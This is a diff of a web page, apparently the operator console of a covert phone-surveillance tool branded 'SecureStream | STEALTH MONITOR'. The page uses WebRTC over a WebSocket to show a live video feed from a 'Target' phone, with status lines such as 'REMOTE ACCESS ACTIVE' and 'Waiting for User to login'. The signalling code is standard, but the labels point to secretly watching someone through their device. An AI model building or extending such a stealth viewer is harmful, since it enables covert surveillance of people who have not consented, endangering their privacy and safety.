@@ -7,83 +7,119 @@
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
         :root { --primary: #ef4444; --bg: #0f172a; --glass: rgba(255, 255, 255, 0.05); --border: rgba(255, 255, 255, 0.1); }
-        body { margin: 0; padding: 0; font-family: 'Poppins', sans-serif; background: #0f172a; color: white; display: flex; flex-direction: column; height: 100vh; }
-        header { padding: 20px 40px; background: rgba(0,0,0,0.3); border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; }
+        body { margin: 0; padding: 0; font-family: 'Poppins', sans-serif; background: var(--bg); color: white; display: flex; flex-direction: column; height: 100vh; }
+        header { padding: 20px 40px; background: rgba(0,0,0,0.3); border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
         .logo { font-size: 22px; font-weight: 600; color: #3b82f6; }
+        .logo span { color: var(--primary); }
         .container { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
         .monitor-box { width: 100%; max-width: 800px; aspect-ratio: 16/9; background: #000; border-radius: 20px; border: 2px solid var(--primary); position: relative; overflow: hidden; box-shadow: 0 0 30px rgba(239, 68, 68, 0.2); }
-        #remoteVideo { width: 100%; height: 100%; object-fit: cover; }
-        .live-indicator { position: absolute; top: 20px; left: 20px; background: var(--primary); padding: 5px 15px; border-radius: 5px; font-size: 12px; font-weight: 600; animation: blink 1.5s infinite; visibility: hidden; }
+        #remoteVideo { width: 100%; height: 100%; object-fit: cover; background: black; }
+        .live-indicator { position: absolute; top: 20px; left: 20px; background: var(--primary); padding: 5px 15px; border-radius: 5px; font-size: 12px; font-weight: 600; animation: blink 1.5s infinite; visibility: hidden; z-index: 10; }
         @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
-        .status-msg { color: #94a3b8; font-size: 14px; margin-top: 15px; background: var(--glass); padding: 10px 20px; border-radius: 10px; }
+        .status-msg { color: #94a3b8; font-size: 14px; margin-top: 15px; background: var(--glass); padding: 10px 20px; border-radius: 10px; border: 1px solid var(--border); }
     </style>
 </head>
 <body>
 
 <header>
-    <div class="logo">Secure<span>Stream</span> <small style="color:white; font-size:11px;">| STEALTH MONITOR</small></div>
-    <div style="font-size: 13px;">Target: <span style="color: #3b82f6;" th:text="${adminName}">Active User</span></div>
+    <div class="logo">Secure<span>Stream</span> <small style="color:white; font-size:11px; margin-left:10px;">| STEALTH MONITOR</small></div>
+    <div style="font-size: 13px;">Target: <span style="color: #3b82f6;" th:text="${adminName}">Active Phone</span></div>
 </header>
 
 <div class="container">
     <div class="monitor-box">
-        <div id="liveBadge" class="live-indicator">LIVE FEED</div>
-        <video id="remoteVideo" autoplay playsinline></video>
+        <div id="liveBadge" class="live-indicator">LIVE FEED ACTIVE</div>
+        <video id="remoteVideo" autoplay playsinline muted></video>
     </div>
-    <div class="status-msg" id="statusMsg">Connecting to remote target...</div>
+    <div class="status-msg" id="statusMsg">Initializing Secure Connection...</div>
 </div>
 
 <script>
     let peerConnection;
     let socket;
 
+    // Google STUN Servers (Free for WebRTC)
     const configuration = {
         'iceServers': [
             { 'urls': 'stun:stun.l.google.com:19302' },
-            { 'urls': 'stun:stun1.l.google.com:19302' }
+            { 'urls': 'stun:stun1.l.google.com:19302' },
+            { 'urls': 'stun:stun2.l.google.com:19302' }
         ]
     };
 
     function connectWebSocket() {
         const protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
-        socket = new WebSocket(protocol + window.location.host + "/video-stream");
+        // Render URL setup
+        const wsUrl = protocol + window.location.host + "/video-stream";
+        socket = new WebSocket(wsUrl);
 
         socket.onopen = () => {
-            document.getElementById('statusMsg').innerText = "Waiting for User to login...";
+            document.getElementById('statusMsg').innerText = "Connected to Server. Waiting for Phone Stream...";
+            document.getElementById('statusMsg').style.color = "#3b82f6";
         };
 
         socket.onmessage = async (event) => {
-            const data = JSON.parse(event.data);
-            if (data.type === 'offer') {
-                handleOffer(data);
-            } else if (data.type === 'candidate' && peerConnection) {
-                try { await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate)); } catch(e){}
+            try {
+                const data = JSON.parse(event.data);
+
+                if (data.type === 'offer') {
+                    console.log("Offer Received from Phone");
+                    handleOffer(data);
+                } else if (data.type === 'candidate' && peerConnection) {
+                    console.log("Adding ICE Candidate");
+                    await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));
+                }
+            } catch (e) {
+                console.error("Signal Error:", e);
             }
         };
-        socket.onclose = () => setTimeout(connectWebSocket, 2000);
+
+        socket.onclose = () => {
+            document.getElementById('statusMsg').innerText = "Connection Lost. Retrying...";
+            document.getElementById('statusMsg').style.color = "#ef4444";
+            setTimeout(connectWebSocket, 3000);
+        };
     }
 
     async function handleOffer(offer) {
+        // Peer Connection Setup
         peerConnection = new RTCPeerConnection(configuration);
-        peerConnection.ontrack = (event) => {
-            document.getElementById('remoteVideo').srcObject = event.streams[0];
-            document.getElementById('statusMsg').innerText = "REMOTE ACCESS ACTIVE";
-            document.getElementById('statusMsg').style.color = "#22c55e";
-            document.getElementById('liveBadge').style.visibility = "visible";
-        };
 
-        peerConnection.onicecandidate = (event) => {
-            if (event.candidate && socket.readyState === WebSocket.OPEN) {
-                socket.send(JSON.stringify({ type: 'candidate', candidate: event.candidate }));
+        // Jab remote video track receive ho
+        peerConnection.ontrack = (event) => {
+            console.log("Stream Received!");
+            const remoteVideo = document.getElementById('remoteVideo');
+            if (remoteVideo.srcObject !== event.streams[0]) {
+                remoteVideo.srcObject = event.streams[0];
+                document.getElementById('statusMsg').innerText = "SYSTEM SECURE: LIVE FEED ESTABLISHED";
+                document.getElementById('statusMsg').style.color = "#22c55e";
+                document.getElementById('liveBadge').style.visibility = "visible";
             }
         };
 
+        // ICE Candidates bhejho phone ko
+        peerConnection.onicecandidate = (event) => {
+            if (event.candidate && socket.readyState === WebSocket.OPEN) {
+                socket.send(JSON.stringify({
+                    type: 'candidate',
+                    candidate: event.candidate
+                }));
+            }
+        };
+
+        // WebRTC Signaling Process
         await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
         const answer = await peerConnection.createAnswer();
         await peerConnection.setLocalDescription(answer);
-        socket.send(JSON.stringify({ type: 'answer', sdp: answer.sdp }));
+
+        // Send Answer back to Phone
+        socket.send(JSON.stringify({
+            type: 'answer',
+            sdp: answer.sdp
+        }));
     }
 
+    // Start on Page Load
     window.onload = connectWebSocket;
 </script>
 </body>
